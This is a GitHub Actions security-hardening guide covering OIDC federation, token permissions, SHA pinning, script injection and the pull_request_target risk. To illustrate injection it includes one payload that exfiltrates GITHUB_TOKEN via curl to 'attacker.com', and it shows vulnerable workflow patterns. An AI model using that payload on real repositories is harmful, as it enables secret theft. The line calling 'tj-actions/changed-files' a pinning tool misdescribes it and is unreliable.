---
description: GitHub Actions security hardening — OIDC federation, least-privilege tokens, secret scanning, and supply chain protection.
---

# GitHub Actions — Security Hardening

## The Core Threat Model

Every workflow runs arbitrary code on a runner. If an attacker can modify a workflow or inject commands, they gain access to your secrets and deployment targets.

> **Senior Mindset:** Treat every 3rd-party Action as a potential supply chain attack vector. Pin everything. Grant minimum permissions.

***

## OIDC — Eliminating Long-Lived Secrets

### The Problem with Static Credentials
Storing `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` as GitHub secrets means:
- A single secret leak = full cloud access until manually rotated
- Rotation is manual and error-prone
- No audit trail per-workflow

### OIDC Architecture

```
GitHub Actions Runner
        │
        │ 1. Request OIDC token (JWT)
        ▼
GitHub OIDC Provider (tokens.actions.githubusercontent.com)
        │
        │ 2. Return short-lived JWT (ttl: 1 hour)
        ▼
GitHub Actions Step
        │
        │ 3. Exchange JWT for cloud credentials
        ▼
AWS STS / Azure AD / GCP STS
        │
        │ 4. Return temporary credentials (15 min)
        ▼
Workflow continues with scoped access
```

### AWS OIDC Setup

**Step 1 — Create the OIDC Provider in AWS:**
```bash
# Terraform example
resource "aws_iam_openid_connect_provider" "github" {
  url             = "https://token.actions.githubusercontent.com"
  client_id_list  = ["sts.amazonaws.com"]
  thumbprint_list = ["6938fd4d98bab03faadb97b34396831e3780aea1"]
}
```

**Step 2 — Create a Role with a Trust Policy:**
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "Federated": "arn:aws:iam::ACCOUNT_ID:oidc-provider/token.actions.githubusercontent.com"
    },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
      },
      "StringLike": {
        "token.actions.githubusercontent.com:sub": "repo:MY_ORG/MY_REPO:*"
      }
    }
  }]
}
```

**Step 3 — Use in Workflow (zero static secrets):**
```yaml
permissions:
  id-token: write   # REQUIRED for OIDC
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::ACCOUNT_ID:role/github-actions-deploy
          aws-region: us-east-1
      
      - run: aws s3 cp dist/ s3://my-bucket/ --recursive
```

***

## Least-Privilege Token Permissions

The `GITHUB_TOKEN` auto-generated for each job has configurable scopes. Default is often too broad.

```yaml
# Global default — deny everything
permissions: {}   # or: read-all

jobs:
  build:
    permissions:
      contents: read          # Only read source code
      packages: write         # Push to GitHub Container Registry
      security-events: write  # Upload SARIF results

  release:
    permissions:
      contents: write         # Create a release
      id-token: write         # OIDC
```

***

## Pinning Actions to Commit SHAs

```yaml
# DANGEROUS — tag can be moved or deleted
- uses: actions/checkout@v4

# SAFE — commit SHA is immutable
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

**Tooling:** Use `tj-actions/changed-files` pinned version manager or `Dependabot` for Actions to auto-PR SHA updates.

***

## Preventing Script Injection

**VULNERABLE — user-controlled data injected into shell:**
```yaml
# PR title is attacker-controlled
- run: echo "${{ github.event.pull_request.title }}"
```

An attacker sets PR title to: `"; curl attacker.com/exfil?t=$GITHUB_TOKEN #`

**SAFE — pass via environment variable:**
```yaml
- name: Process PR title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "$PR_TITLE"    # Shell cannot interpret $PR_TITLE as commands
```

***

## `pull_request_target` — The Dangerous Event

`pull_request_target` runs in the context of the **base branch** and has access to secrets. Combining it with `actions/checkout` to check out the fork's code is a known RCE vulnerability.

```yaml
# DANGEROUS PATTERN
on: pull_request_target
jobs:
  test:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # ← Checks out fork's code WITH secrets
      - run: ./ci/test.sh   # Attacker controls this file!
```

**Safe Pattern:** Run untrusted code in a job with `permissions: {}` and no secrets access, then pass results to a privileged job.

***

## Logic & Trickiness Table

| Risk | Common Mistake | Hardened Approach |
|:---|:---|:---|
| **Supply chain** | `uses: action@v2` tag | Pin to commit SHA |
| **Secret sprawl** | Static cloud creds in secrets | OIDC federation |
| **Overprivileged token** | Default `GITHUB_TOKEN` scope | Explicit `permissions:` block |
| **Script injection** | `echo "${{ github.event.* }}"` | Use env vars, never inline |
| **Fork PRs** | `pull_request_target` + checkout | Separate jobs by trust level |
